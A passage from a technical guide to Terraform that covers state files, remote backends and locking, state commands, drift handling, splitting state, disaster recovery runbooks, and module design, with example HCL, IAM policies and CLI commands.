| `terraform_version` | The CLI that last wrote it | ⚠️ Older CLIs refuse to read state written by newer ones |
| `serial` | Increments on every write | Used for optimistic concurrency and stale-plan detection |
| `lineage` | UUID identifying this state's history | ⚠️ Two states with different lineages cannot be merged casually |
| `outputs` | Root module outputs | What `terraform_remote_state` reads |
| `resources[].instances[].attributes` | **A full cached copy of every attribute** | This is where secrets live |
| `sensitive_attributes` | Which attributes to redact in CLI output | Redaction only — **the value above it is still plaintext** |
| `dependencies` | Recorded graph edges | Used to order destroys correctly even if config is gone |
| `private` | Provider-internal opaque blob | Do not touch |

### 17.3 Why state exists at all

Three jobs, none of which can be done without it:

1. **Mapping.** `aws_db_instance.main` → `prod-api-db`. Cloud APIs have no concept of your Terraform address.
2. **Metadata.** Dependency edges are recorded so that destroys order correctly even after you delete the config.
3. **Performance.** The cached attributes let Terraform diff without a full API enumeration. On a 2,000-resource stack this is the difference between a 40-second plan and an unusable one.

"Why can't Terraform just query the cloud?" — because there is no reliable way to ask "which of these ten thousand resources did *you* create, and which of my config blocks does each correspond to?" Tagging helps but is not universal, not enforced, and not sufficient for resources without tags.

### 17.4 Why state is dangerous

```mermaid
flowchart TD
    S["terraform.tfstate"]
    S --> R1["Contains SECRETS in plaintext<br/>RDS passwords, generated keys,<br/>API tokens read via data sources"]
    S --> R2["Contains a full INVENTORY<br/>of your infrastructure —<br/>a reconnaissance goldmine"]
    S --> R3["Is the ONLY link between config<br/>and reality. Lose it and Terraform<br/>will try to recreate everything"]
    S --> R4["A corrupted or edited state can make<br/>Terraform confidently destroy<br/>production"]
    S --> R5["Concurrent writes without locking<br/>produce SPLIT-BRAIN state"]

    R1 --> M1["Mitigate: encrypt at rest,<br/>restrict IAM, use ephemeral +<br/>write-only attributes"]
    R2 --> M1
    R3 --> M2["Mitigate: S3 versioning,<br/>backups, tested recovery"]
    R4 --> M3["Mitigate: never hand-edit;<br/>use moved/import/removed"]
    R5 --> M4["Mitigate: native locking,<br/>CI concurrency groups"]
```

⚠️ **Never commit state to git.** It is the single most common way credentials leak from infrastructure repositories. Even a private repo is read by every engineer, every CI job, every integration, and every fork.

---

## Chapter 18 — Backends

### 18.1 Local vs remote

Local state (`terraform.tfstate` on disk) is the default and is acceptable only for throwaway experiments. It cannot be shared, cannot be locked, and is one laptop failure away from gone.

### 18.2 The S3 backend, current form

```hcl
terraform {
  backend "s3" {
    bucket       = "acme-tfstate-123456789012"
    key          = "apps/api/production/terraform.tfstate"
    region       = "ap-south-1"
    encrypt      = true
    kms_key_id   = "arn:aws:kms:ap-south-1:123456789012:alias/tfstate"
    use_lockfile = true          # 🔬 native locking, GA in Terraform 1.11 / OpenTofu 1.11
  }
}
```

🔬 **`use_lockfile` replaces DynamoDB.** It was experimental in Terraform 1.10 and GA in 1.11. The `dynamodb_table` argument is **deprecated** and scheduled for removal in a future minor release.

How it works: Terraform writes a small object at `<key>.tflock` alongside the state, using S3 conditional writes to guarantee atomicity. No extra table, no extra cost, no extra IAM surface.

**Migrating from DynamoDB locking:**

```hcl
# Step 1 — set BOTH. Terraform acquires both locks, so mixed-version
# teams remain safe during the transition.
terraform {
  backend "s3" {
    bucket         = "acme-tfstate-123456789012"
    key            = "apps/api/production/terraform.tfstate"
    region         = "ap-south-1"
    encrypt        = true
    use_lockfile   = true
    dynamodb_table = "terraform-locks"   # keep temporarily
  }
}

# Step 2 — once everyone is on Terraform >= 1.11, remove dynamodb_table
# and delete the table.
```

**The IAM policy the backend needs:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ListStateBucket",
      "Effect": "Allow",
      "Action": ["s3:ListBucket"],
      "Resource": "arn:aws:s3:::acme-tfstate-123456789012"
    },
    {
      "Sid": "ReadWriteStateAndLock",
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject", "s3:DeleteObject"],
      "Resource": [
        "arn:aws:s3:::acme-tfstate-123456789012/apps/api/production/terraform.tfstate",
        "arn:aws:s3:::acme-tfstate-123456789012/apps/api/production/terraform.tfstate.tflock"
      ]
    },
    {
      "Sid": "UseStateKey",
      "Effect": "Allow",
      "Action": ["kms:Decrypt", "kms:GenerateDataKey"],
      "Resource": "arn:aws:kms:ap-south-1:123456789012:key/abcd-1234"
    }
  ]
}
```

⚠️ **The `.tflock` object needs `s3:DeleteObject` too.** A policy that grants Get/Put on the state key but forgets the lock key produces a confusing "failed to release lock" at the end of every apply.

🧠 Note the resource is scoped to **one state key**, not the whole bucket. This means the `api/production` role cannot read the `data/production` state, which contains the database password. Per-stack scoping is a meaningful security boundary; take it.

### 18.3 The GCS backend

```hcl
terraform {
  backend "gcs" {
    bucket                      = "acme-tfstate"
    prefix                      = "apps/api/production"
    impersonate_service_account = "terraform@acme-prod.iam.gserviceaccount.com"
  }
}
```

**Locking is automatic and requires no extra resources** — the GCS backend uses object generation preconditions. There is no DynamoDB equivalent to configure and never was.

Bucket setup:

```hcl
resource "google_storage_bucket" "tfstate" {
  name                        = "acme-tfstate"
  location                    = "ASIA-SOUTH1"
  force_destroy               = false
  uniform_bucket_level_access = true
  public_access_prevention    = "enforced"

  versioning { enabled = true }

  encryption {
    default_kms_key_name = google_kms_crypto_key.tfstate.id
  }

  lifecycle_rule {
    condition { num_newer_versions = 100 }
    action { type = "Delete" }
  }

  lifecycle { prevent_destroy = true }
}
```

Note `prefix` rather than `key` — GCS organises state by prefix, and workspaces become `prefix/<workspace>.tfstate`.

### 18.4 The azurerm backend

```hcl
terraform {
  backend "azurerm" {
    resource_group_name  = "rg-tfstate"
    storage_account_name = "acmetfstate"
    container_name       = "tfstate"
    key                  = "apps/api/production.tfstate"
    use_oidc             = true
    use_azuread_auth     = true
  }
}
```

Locking uses Azure Blob leases, automatically.

*(Azure coverage in this guide is directional — verify against current docs.)*

### 18.5 HCP Terraform as a backend

```hcl
terraform {
  cloud {
    organization = "acme"
    workspaces {
      name = "api-production"
    }
  }
}
```

Gives you managed state, encryption, versioning, locking, a run UI, Sentinel policy and a private module registry — in exchange for cost and a dependency on a third party for your infrastructure changes.

### 18.6 Partial backend configuration

Backend blocks cannot use variables or expressions. This is a deliberate restriction: the backend must be resolvable before Terraform evaluates anything. The workaround:

```hcl
# terraform.tf — only the invariant parts
terraform {
  backend "s3" {
    region       = "ap-south-1"
    encrypt      = true
    use_lockfile = true
  }
}
```

```bash
terraform init \
  -backend-config="bucket=acme-tfstate-123456789012" \
  -backend-config="key=apps/api/production/terraform.tfstate"
```

Or a file per environment:

```hcl
# backends/production.hcl
bucket = "acme-tfstate-123456789012"
key    = "apps/api/production/terraform.tfstate"
```

```bash
terraform init -backend-config=backends/production.hcl
```

⚠️ This is exactly the boilerplate Terragrunt exists to eliminate (Chapter 67). With a directory-per-environment layout you simply write the full backend block in each directory, and accept a few duplicated lines. **Recommendation:** for a small team, duplicate the lines. It is explicit, greppable, and requires no extra tool.

### 18.7 Backend comparison

| | S3 + `use_lockfile` | GCS | azurerm | HCP Terraform |
|---|---|---|---|---|
| Locking | Native lockfile (1.11+) | Automatic | Blob lease | Built in |
| Extra resources needed | None (DynamoDB no longer required) | None | None | N/A |
| Encryption at rest | SSE-KMS | CMEK | SSE | Managed |
| Versioning | Bucket versioning | Object versioning | Blob versioning | Built in, with a UI |
| Access control | IAM per object key | IAM per prefix | RBAC | Workspace permissions |
| Cost | Pennies | Pennies | Pennies | 💰 Per-resource pricing at scale |
| State encryption client-side | ❌ (🔬 OpenTofu only) | ❌ | ❌ | N/A |
| Run history / audit UI | ❌ | ❌ | ❌ | ✅ |

---

## Chapter 19 — Locking

### 19.1 The problem

```mermaid
sequenceDiagram
    participant A as Engineer A
    participant S as State
    participant B as Engineer B

    Note over A,B: WITHOUT LOCKING
    A->>S: read state (serial 42)
    B->>S: read state (serial 42)
    A->>A: apply — creates sg-aaa
    A->>S: write state (serial 43, contains sg-aaa)
    B->>B: apply — creates sg-bbb
    B->>S: write state (serial 43, contains sg-bbb)
    Note over S: ⚠️ sg-aaa is now ORPHANED.<br/>It exists in AWS, costs money,<br/>and Terraform does not know about it.

    Note over A,B: WITH LOCKING
    A->>S: acquire lock ✅
    B->>S: acquire lock ❌ BLOCKED
    A->>S: apply, write, release
    B->>S: acquire lock ✅ (re-reads serial 43)
    B->>B: plans against A's result correctly
```

### 19.2 Lock behaviour

```bash
terraform apply -lock-timeout=10m     # wait up to 10 minutes instead of failing immediately
terraform apply -lock=false           # ⚠️ NEVER do this on shared state
```

⚠️ `-lock=false` exists for broken backends and emergency recovery. Using it routinely — "the lock was stuck again" — is how split-brain state happens. If locks get stuck regularly, fix the cause, which is nearly always a CI job being killed mid-apply.

### 19.3 Stuck locks

When a runner is terminated during apply, the lock survives.

```
Error: Error acquiring the state lock

Lock Info:
  ID:        a1b2c3d4-e5f6-7890-abcd-ef1234567890
  Path:      acme-tfstate-123456789012/apps/api/production/terraform.tfstate
  Operation: OperationTypeApply
  Who:       runner@fv-az123
  Created:   2026-09-23 14:22:11.123456 +0000 UTC
```

**Before you force-unlock, answer this: is the original process still running?**

```mermaid
flowchart TD
    A["Stuck lock"] --> B{"Is the original apply<br/>still running?"}
    B -->|"Unsure"| C["CHECK: the GitHub Actions run,<br/>CloudTrail for recent API calls,<br/>the 'Who' and 'Created' fields"]
    C --> B
    B -->|"YES"| D["⚠️ WAIT. Force-unlocking now<br/>causes concurrent applies<br/>and split-brain state"]
    B -->|"NO — runner was killed"| E["terraform force-unlock LOCK_ID"]
    E --> F["⚠️ Then run plan and inspect<br/>very carefully. The interrupted apply<br/>may have made partial changes"]
```

```bash
terraform force-unlock a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

⚠️ **After any force-unlock, assume state may be inconsistent with reality.** Run a plan and read every line. The interrupted apply might have created resources it never recorded.

### 19.4 Two layers of concurrency control

State locking protects the state file. It does **not** prevent two CI jobs from starting and one waiting pointlessly for ten minutes. Add a GitHub Actions concurrency group as the outer layer:

```yaml
concurrency:
  group: terraform-${{ inputs.stack }}-${{ inputs.environment }}
  cancel-in-progress: false      # ⚠️ NEVER true for apply
```

🧠 Two layers, two purposes: the concurrency group prevents the *queue*; the state lock prevents the *corruption*. You want both.

---

## Chapter 20 — State Commands

⚠️ **Everything in this chapter modifies state directly, bypassing the plan.** Prefer `moved`, `import` and `removed` blocks. These commands are for situations those blocks cannot express, and for emergencies.

**Before any state command: take a backup.**

```bash
terraform state pull > backup-$(date +%Y%m%d-%H%M%S).tfstate
```

### 20.1 The commands

```bash
# Inspect
terraform state list                              # every address
terraform state list 'module.database.*'          # filtered
terraform state show aws_db_instance.main         # full attributes
terraform show -json | jq '.values.root_module'   # machine-readable
terraform state pull > current.tfstate            # download raw

# Modify
terraform state mv aws_instance.web aws_instance.api
terraform state mv aws_db_instance.main module.database.aws_db_instance.main
terraform state mv -state-out=../data/terraform.tfstate aws_db_instance.main aws_db_instance.main

terraform state rm aws_s3_bucket.legacy           # forget, do not destroy
terraform state replace-provider \
  registry.terraform.io/hashicorp/aws \
  registry.opentofu.org/hashicorp/aws

terraform state push current.tfstate              # ⚠️⚠️ last resort only
```

### 20.2 `terraform state rm` vs `removed` block

| | `terraform state rm` | `removed` block |
|---|---|---|
| Where | CLI, on someone's laptop | In the configuration |
| Reviewed | ❌ | ✅ in a PR |
| Previewed in a plan | ❌ | ✅ |
| Runs in CI | Awkwardly | ✅ naturally |
| Auditable | Only if someone wrote it down | ✅ git history |

**Recommendation:** ban `terraform state rm` in your team's practices, except during an incident with a second engineer watching. Use `removed` blocks.

### 20.3 `taint` and `-replace`

`terraform taint` is **deprecated**. Use:

```bash
terraform apply -replace=aws_instance.web
```

The difference matters: `taint` immediately mutated state, so the replacement was invisible until the next plan. `-replace` is a **plan-time** flag, so you see the destroy-and-create in the plan before approving it.

---

## Chapter 21 — Import and Drift

### 21.1 Drift: what it is

**Drift** is divergence between recorded state and reality, caused by a change made outside Terraform.

```mermaid
flowchart TD
    A["Someone opens the AWS console<br/>during an incident and adds<br/>an inbound rule to a security group"] --> B["Reality: SG has 4 rules"]
    C["State: SG has 3 rules"] --> D["Next terraform plan"]
    B --> D
    D --> E["REFRESH reads reality → 4 rules"]
    E --> F["DIFF against config → config says 3"]
    F --> G["Plan: ~ update in place<br/>(remove the 4th rule)"]
    G --> H{"Was that rule<br/>needed?"}
    H -->|"It was a temporary<br/>incident fix"| I["✅ Terraform correctly removes it"]
    H -->|"It was a permanent<br/>necessary change"| J["⚠️ Terraform will BREAK production<br/>unless someone codifies it first"]
```

🧠 **This is why drift detection matters more than it seems.** The dangerous case is not that Terraform notices drift — it is that nobody looks at a plan for three weeks, and then an unrelated deploy silently reverts an emergency fix.

### 21.2 Detecting drift

```bash
terraform plan -detailed-exitcode
# 0 = no changes
# 1 = error
# 2 = changes present
```

Chapter 49 builds this into a scheduled GitHub Actions workflow that opens an issue.

### 21.3 Handling drift

| Situation | Action |
|---|---|
| Change was temporary and is no longer needed | Let the next apply revert it |
| Change is correct and should be permanent | **Codify it**: update the config to match, then apply (which is a no-op) |
| Change is correct but Terraform should not manage that attribute | `lifecycle { ignore_changes = [...] }` with a comment explaining who does manage it |
| Resource was deleted outside Terraform | Plan will recreate it. Verify that is safe first |
| Resource was created outside Terraform | Import it (Chapter 60) or explicitly leave it unmanaged |

### 21.4 Refresh behaviour

```bash
terraform plan                       # refresh, then diff (default)
terraform plan -refresh=false        # diff against cached state — fast, possibly stale
terraform apply -refresh-only        # ONLY update state to match reality; no infrastructure changes
```

`-refresh-only` is a genuinely useful and under-used command. It lets you accept drift into state deliberately, reviewing exactly what changed, without touching infrastructure.

💰 `-refresh=false` matters at scale: refreshing a 3,000-resource stack can take several minutes of API calls. Chapter 64 covers when the trade-off is worth it.

---

## Chapter 22 — Splitting and Merging State

### 22.1 Why you will need this

Every growing Terraform codebase eventually has one state file that is too big — slow plans, wide blast radius, and a database sitting in the same state as a service that deploys six times a day. Splitting is a rite of passage.

### 22.2 Splitting, step by step

```mermaid
flowchart TD
    A["One state: foundation + data + app"] --> B["1. Create the new stack directory<br/>with its own backend key"]
    B --> C["2. Copy the relevant resource blocks<br/>into the new stack"]
    C --> D["3. Add outputs to the OLD stack<br/>for anything the new one needs"]
    D --> E["4. terraform state pull from OLD<br/>→ backup"]
    E --> F["5. terraform state mv -state-out<br/>for each resource"]
    F --> G["6. Delete the resource blocks<br/>from the OLD config"]
    G --> H["7. terraform plan in BOTH stacks<br/>— both must show ZERO changes"]
    H --> I{"Zero changes<br/>in both?"}
    I -->|"no"| J["⚠️ STOP. Restore the backup<br/>and work out what differs"]
    I -->|"yes"| K["8. Commit. Wire cross-stack<br/>references (Chapter 28)"]
```

The mechanics:

```bash
# In the OLD stack directory
terraform state pull > /tmp/old-backup.tfstate

# Pull the target stack's (empty) state to a local file
cd ../data
terraform init
terraform state pull > /tmp/new.tfstate

# Move resources from old state into the new state file
cd ../foundation
terraform state mv -state-out=/tmp/new.tfstate \
  aws_db_instance.main aws_db_instance.main
terraform state mv -state-out=/tmp/new.tfstate \
  aws_db_subnet_group.main aws_db_subnet_group.main
terraform state mv -state-out=/tmp/new.tfstate \
  aws_security_group.database aws_security_group.database

# Push the populated state into the new backend
cd ../data
terraform state push /tmp/new.tfstate

# Verify — this is the step that matters
terraform plan       # must be: No changes
cd ../foundation
terraform plan       # must be: No changes
```

⚠️ **"No changes" in both is the acceptance test.** Anything else means you have mismatched configuration between the two stacks, and applying will destroy or recreate real resources.

### 22.3 The `lineage` problem

Every state file has a `lineage` UUID. Pushing a state whose lineage differs from what the backend holds produces:

> `Error: Invalid state file lineage`

```bash
terraform state push -force /tmp/new.tfstate
```

⚠️ `-force` overrides the check. Only use it when you are pushing into a genuinely empty new backend and you understand you are discarding whatever was there.

### 22.4 An easier alternative: re-import

For a small number of resources, splitting by **import** is often safer than by `state mv`:

1. In the new stack, write the resource blocks and `import` blocks for each resource.
2. `terraform apply` in the new stack — plan shows only imports.
3. In the old stack, replace the resource blocks with `removed { lifecycle { destroy = false } }`.
4. `terraform apply` in the old stack.

This path is fully code-reviewed, runs in CI, and never requires local state surgery. It is slower to write but much harder to get catastrophically wrong.

**Recommendation:** use the import/removed path unless you are moving more than ~20 resources.

---

## Chapter 23 — State Disasters and Recovery

This chapter is the one to read *before* you need it.

### 23.1 Disaster 1: the state file is deleted

**Symptoms:** `terraform plan` proposes to create everything. `Plan: 247 to add, 0 to change, 0 to destroy.`

⚠️ **Do not apply.** You will get duplicate infrastructure, name collisions, and a much worse situation.

**Recovery, in order of preference:**

```bash
# 1. S3 versioning — if you enabled it (Chapter 8 says you did)
aws s3api list-object-versions \
  --bucket acme-tfstate-123456789012 \
  --prefix apps/api/production/terraform.tfstate \
  --query 'Versions[?IsLatest==`false`].[VersionId,LastModified]' \
  --output table

aws s3api get-object \
  --bucket acme-tfstate-123456789012 \
  --key apps/api/production/terraform.tfstate \
  --version-id <VERSION_ID> \
  recovered.tfstate

terraform state push recovered.tfstate

# 2. A local .terraform/terraform.tfstate.backup on someone's machine
# 3. A CI artifact, if your pipeline uploads state backups
# 4. Rebuild by importing everything — see below
```

**If there is no backup:** you must rebuild state by importing. For a few dozen resources this is a long day. For a few hundred, use `import` blocks with `for_each` driven by a list you extract from the cloud API, plus `-generate-config-out` as a starting point. It is tedious but entirely doable.

🧠 **The lesson, and it is the whole reason Chapter 8 insists on it: enable S3/GCS versioning on the state bucket with a 365-day retention on noncurrent versions.** It converts a catastrophe into a five-minute recovery.

### 23.2 Disaster 2: corrupted state

**Symptoms:** `Error: Failed to load state: unexpected end of JSON input`, or Terraform reports absurd diffs.

```bash
# Validate the JSON
terraform state pull | jq empty            # errors if malformed

# If malformed, roll back to the previous S3 version (as above)
```

⚠️ **Do not hand-edit state to fix corruption.** People do, and it works occasionally, and the failure mode when it does not is losing production. Roll back to a known-good version and replay the changes since then.

### 23.3 Disaster 3: apply failed halfway

**Symptoms:** `Apply complete! Resources: 12 added, 0 changed, 0 destroyed.` followed by `Error: ... 3 resources failed`.

Terraform writes state **incrementally**, after each resource. So state is accurate for what completed. This is the good news.

```bash
terraform plan
# Shows the remaining work. Usually you can simply:
terraform apply
```

⚠️ **The genuinely bad case** is when a resource was created in the cloud but the state write failed — typically a network drop at exactly the wrong moment. Then:

```
Error: creating S3 Bucket: BucketAlreadyOwnedByYou
```

The fix is to import the orphan:

```hcl
import {
  to = aws_s3_bucket.new
  id = "acme-production-new"
}
```

### 23.4 Disaster 4: split-brain from concurrent applies

**Symptoms:** resources exist in AWS that are in nobody's state. Costs appear from nowhere. Two engineers each see a plan the other does not expect.

**Detection:**

```bash
# Compare what exists against what state knows
aws resourcegroupstaggingapi get-resources \
  --tag-filters Key=ManagedBy,Values=terraform \
  --query 'ResourceTagMappingList[].ResourceARN' --output text \
  | tr '\t' '\n' | sort > /tmp/in-aws.txt

terraform state list > /tmp/in-state.txt
# Then reconcile manually, or use a tool like driftctl/cloud-nuke's inventory mode
```

**Recovery:** import the orphans, or delete them if they were duplicates. **Prevention:** locking plus a CI concurrency group, and no human apply credentials.

### 23.5 Disaster 5: accidental destroy

**Symptoms:** `Apply complete! Resources: 0 added, 0 changed, 89 destroyed.`

**What actually saves you** (in order of how much you will wish you had it):

1. `prevent_destroy` on stateful resources — the plan would have failed.
2. RDS deletion protection and final snapshots — the database can be restored.
3. S3 versioning on data buckets — objects can be restored.
4. An apply IAM role with no `Delete*` permission on stateful types.
5. Environment approval gates — a human would have seen `89 to destroy`.

**Recovery is resource-specific and usually partial.** Stateless things (security groups, target groups) come back with an apply. Databases come back from a snapshot, with data loss equal to the snapshot age. Deleted KMS keys are, after the deletion window, gone permanently along with everything they encrypted.

### 23.6 Disaster 6: secrets leaked into state

Covered fully in Chapter 41. The short version: **rotate the secret immediately.** Removing it from state does not un-leak it, because S3 versioning retains the old state, CI logs may contain it, and anyone with read access has already had the opportunity.

### 23.7 The recovery drill

**Recommendation:** run this once a quarter, in a non-production account.

1. Pick a staging stack.
2. Delete its state object (you have versioning; this is safe).
3. Time how long it takes someone who was not involved to recover it using only your runbook.
4. Fix whatever made it slow.

A recovery procedure that has never been executed is a hypothesis, not a procedure.

### 23.8 Prevention checklist

- [ ] State bucket has **versioning** enabled with ≥365-day noncurrent retention.
- [ ] State bucket has `prevent_destroy = true`.
- [ ] State encrypted with a customer-managed KMS key.
- [ ] Public access block on the state bucket.
- [ ] IAM scoped **per state key**, not to the whole bucket.
- [ ] Native locking (`use_lockfile`) enabled.
- [ ] CI concurrency group per stack, `cancel-in-progress: false`.
- [ ] `prevent_destroy` on every stateful resource.
- [ ] RDS: `deletion_protection = true`, `skip_final_snapshot = false` in production.
- [ ] No human holds apply credentials — only the CI OIDC role.
- [ ] Production applies require environment approval.
- [ ] A documented, **tested** state recovery runbook.

---
# Part V — Modules and Repository Design

---

## Chapter 24 — Module Anatomy and Design

### 24.1 What a module is

**Every Terraform directory is a module.** The one you run commands in is the **root module**; any module it calls is a **child module**. There is no special syntax that makes something "a module" — it is just a directory of `.tf` files.

```
modules/ecs-service/
├── README.md
├── terraform.tf      # required_version, required_providers — NO backend, NO provider blocks
├── variables.tf
├── main.tf
├── outputs.tf
├── examples/
│   ├── minimal/
│   └── complete/
└── tests/
    └── defaults.tftest.hcl
```

### 24.2 When NOT to write a module

This matters more than knowing how to write one. **Do not create a module when:**

- It wraps a single resource and adds nothing. `module "bucket"` that creates one `aws_s3_bucket` with the same arguments is pure indirection.
- It is used exactly once. Extract it when there is a second caller, not before.
- You do not yet know what varies. Premature modules acquire a dozen `enable_*` booleans and become unreadable.
- The "module" is really an environment. Environments are root modules, not child modules.

🧠 **The rule of three.** Write it inline. Copy it. Copy it again. *Then* extract the module, now that you can see what actually varies.

### 24.3 Thin vs thick modules

```mermaid
flowchart TD
    subgraph THIN["Thin module — one concern"]
        T1["modules/s3-bucket<br/>bucket + versioning + encryption<br/>+ public access block"]
        T2["+ Composable<br/>+ Easy to test<br/>+ Easy to reason about<br/>− Caller wires many modules together"]
    end
    subgraph THICK["Thick module — a whole stack"]
        K1["modules/backend-service<br/>ECS service + ALB + target group +<br/>RDS + Redis + SQS + alarms + IAM"]
        K2["+ One call creates everything<br/>+ Enforces standards<br/>− Rigid; every new need adds a variable<br/>− Enormous blast radius on change"]
    end
    subgraph MID["Recommended middle: composable service module"]
        M1["modules/ecs-service<br/>service + task def + IAM role +<br/>target group + log group + alarms"]
        M2["Composed by the caller with<br/>separate vpc, rds, redis modules"]
    end
```

**Recommendation:** build **thin-to-medium modules around one deployable concern**, and compose them in root modules. A module should have a name a person would use in conversation — "the ECS service module", "the Postgres module".

⚠️ The thick "one module to rule them all" pattern is seductive and ends badly. Version 1 serves three services. By version 14 it has 90 variables, half of which are `enable_x` booleans, and nobody dares change it because it is used in 40 places.

### 24.4 A well-designed module

```hcl
# modules/ecs-service/terraform.tf
terraform {
  required_version = ">= 1.11"      # loose — write-only attrs need 1.11

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = ">= 6.0"            # loose, so consumers can choose
    }
  }
}
```

```hcl
# modules/ecs-service/variables.tf

# ---------- Required ----------
variable "name" {
  description = "Service name. Used as a prefix for all created resources."
  type        = string

  validation {
    condition     = can(regex("^[a-z][a-z0-9-]{1,30}$", var.name))
    error_message = "name must be lowercase alphanumeric with hyphens, 2-31 chars."
  }
}

variable "environment" {
  description = "Deployment environment."
  type        = string

  validation {
    condition     = contains(["dev", "staging", "production"], var.environment)
    error_message = "environment must be dev, staging or production."
  }
}

variable "cluster_arn" {
  description = "ARN of the ECS cluster to deploy into."
  type        = string
}

variable "vpc_id" {
  description = "VPC in which the service runs."
  type        = string
}

variable "subnet_ids" {
  description = "Private subnet IDs for the service's tasks. Minimum two, in different AZs."
  type        = list(string)

  validation {
    condition     = length(var.subnet_ids) >= 2
    error_message = "At least two subnets are required for availability."
  }
}

variable "image" {
  description = "Container image, including tag or digest. Prefer a digest in production."
  type        = string
}

# ---------- Optional, with sensible production-safe defaults ----------
variable "cpu" {
  description = "Fargate CPU units. 1024 = 1 vCPU."
  type        = number
  default     = 512

  validation {
    condition     = contains([256, 512, 1024, 2048, 4096, 8192, 16384], var.cpu)
    error_message = "cpu must be a valid Fargate value."
  }
}

variable "memory" {
  description = "Memory in MiB. Must be compatible with the chosen cpu."
  type        = number
  default     = 1024
}

variable "container_port" {
  description = "Port the container listens on."
  type        = number
  default     = 8080
}

variable "desired_count" {
  description = "Number of tasks. Ignored after creation if autoscaling is enabled."
  type        = number
  default     = 2

  validation {
    condition     = var.desired_count >= 1
    error_message = "desired_count must be at least 1."
  }
}

variable "health_check_path" {
  description = "HTTP path for the load balancer health check."
  type        = string
  default     = "/actuator/health"
}

variable "environment_variables" {
  description = "Non-secret environment variables for the container."
  type        = map(string)
  default     = {}
}

variable "secrets" {
  description = <<-EOT
    Secrets injected by ECS at task start. Map of ENV_VAR_NAME to the ARN of a
    Secrets Manager secret or SSM parameter. The values are resolved by the ECS
    agent, NOT by Terraform, so they never enter Terraform state.
  EOT
  type        = map(string)
  default     = {}
}

variable "autoscaling" {
  description = "Autoscaling configuration. Set to null to disable."
  type = object({
    min_capacity     = number
    max_capacity     = number
    cpu_target       = optional(number, 70)
    memory_target    = optional(number, 80)
    scale_in_cooldown  = optional(number, 300)
    scale_out_cooldown = optional(number, 60)
  })
  default = null
}

variable "tags" {
  description = "Additional tags, merged over the module's own."
  type        = map(string)
  default     = {}
}
```

```hcl
# modules/ecs-service/outputs.tf
output "service_name" {
  description = "Name of the ECS service."
  value       = aws_ecs_service.this.name
}

output "service_arn" {
  description = "ARN of the ECS service."
  value       = aws_ecs_service.this.id
}

output "task_role_arn" {
  description = "ARN of the task role. Attach application permissions to this."
  value       = aws_iam_role.task.arn
}

output "task_role_name" {
  description = "Name of the task role, for attaching additional policies."
  value       = aws_iam_role.task.name
}

output "security_group_id" {
  description = "Security group attached to the service's tasks."
  value       = aws_security_group.service.id
}

output "target_group_arn" {
  description = "Target group ARN, for attaching to a listener rule."
  value       = aws_lb_target_group.this.arn
}

output "log_group_name" {
  description = "CloudWatch log group receiving container logs."
  value       = aws_cloudwatch_log_group.this.name
}
```

### 24.5 Module design principles

| Principle | Why |
|---|---|
| **Every variable has a `description`** | It is the API documentation. `terraform-docs` generates the README from it |
| **Every variable that can be validated, is** | Fail at plan time with a clear message, not at apply with an API error |
| **Defaults are production-safe** | If someone forgets to set encryption, they should get encryption |
| **Loose provider constraints** | `>= 6.0`, not `~> 6.66`. Tight constraints in modules cause unresolvable conflicts |
| **No `provider` blocks** | Chapter 9. It permanently prevents clean removal |
| **No `backend` block** | Child modules have no state of their own |
| **Outputs expose IDs and ARNs, not whole objects** | A whole-object output couples callers to the module's internals |
| **Output the role *name* as well as the ARN** | Callers frequently need to attach a policy |
| **Use `this` as the local name for the primary resource** | Convention: `aws_ecs_service.this`, so addresses read `module.api.aws_ecs_service.this` |
| **Ship `examples/`** | They are documentation *and* the input to your tests |

### 24.6 Composition over configuration

```hcl
# ✅ GOOD — the root module composes small pieces and the wiring is visible
module "vpc" {
  source = "../../modules/vpc"
  name   = local.name_prefix
  cidr   = "10.20.0.0/16"
  azs    = ["ap-south-1a", "ap-south-1b", "ap-south-1c"]
}

module "database" {
  source     = "../../modules/rds-postgres"
  name       = local.name_prefix
  vpc_id     = module.vpc.vpc_id
  subnet_ids = module.vpc.database_subnet_ids
  allowed_security_group_ids = [module.api.security_group_id]
}

module "api" {
  source      = "../../modules/ecs-service"
  name        = "api"
  environment = var.environment
  cluster_arn = module.cluster.arn
  vpc_id      = module.vpc.vpc_id
  subnet_ids  = module.vpc.private_subnet_ids
  image       = var.api_image

  secrets = {
    DB_PASSWORD = module.database.master_password_secret_arn
  }
}
```

```hcl
# ⚠️ BAD — one module, opaque internals, 40 booleans
module "everything" {
  source                    = "../../modules/platform"
  enable_database           = true
  enable_redis              = true
  enable_queue              = false
  enable_cdn                = true
  database_engine_is_aurora = false
  # ... 35 more
}
```

### 24.7 Documenting modules

`terraform-docs` generates the input/output tables from your descriptions:

```yaml
# .terraform-docs.yml
formatter: markdown table
output:
  file: README.md
  mode: inject
sections:
  show: [requirements, providers, inputs, outputs, resources]
sort:
  by: required
```

```bash
terraform-docs .
```

Enforce it in CI so READMEs cannot go stale (Chapter 56).

---

## Chapter 25 — Module Versioning and Registries

### 25.1 Module sources

```hcl
# Local path — no versioning, changes take effect immediately
module "vpc" {
  source = "../../modules/vpc"
}

# Terraform Registry — versioned
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "~> 6.7"
}

# Git over HTTPS, pinned to a tag
module "vpc" {
  source = "git::https://github.com/acme/terraform-modules.git//vpc?ref=v2.4.0"
}

# Git over SSH, pinned to a commit SHA — the most secure form
module "vpc" {
  source = "git::ssh://git@github.com/acme/terraform-modules.git//vpc?ref=a1b2c3d4e5f6789012345678901234567890abcd"
}

# S3
module "vpc" {
  source = "s3::https://acme-modules.s3.ap-south-1.amazonaws.com/vpc-v2.4.0.zip"
}
```

⚠️ **`?ref=main` is the module equivalent of an unpinned dependency.** Someone merges to `main` in the modules repo and your next production apply picks it up with no review. Always pin to a tag; pin to a SHA for anything security-relevant.

### 25.2 Versioning your own modules

Semantic versioning, applied to infrastructure:

| Change | Bump | Examples |
|---|---|---|
| **Major** | Breaking | Removing a variable, renaming a resource (address change), changing a default in a way that forces replacement, raising `required_version` |
| **Minor** | Backwards-compatible addition | New optional variable, new output, new optional resource behind a flag |
| **Patch** | Fix | Bug fix, documentation, tightening validation that was already implied |

⚠️ **The subtle one:** changing a resource's *local name* inside a module is a **major** change, because it changes every consumer's state address. Ship a `moved` block inside the module so consumers upgrade without destroying anything:

```hcl
# modules/ecs-service/moved.tf — shipped as part of v3.0.0
moved {
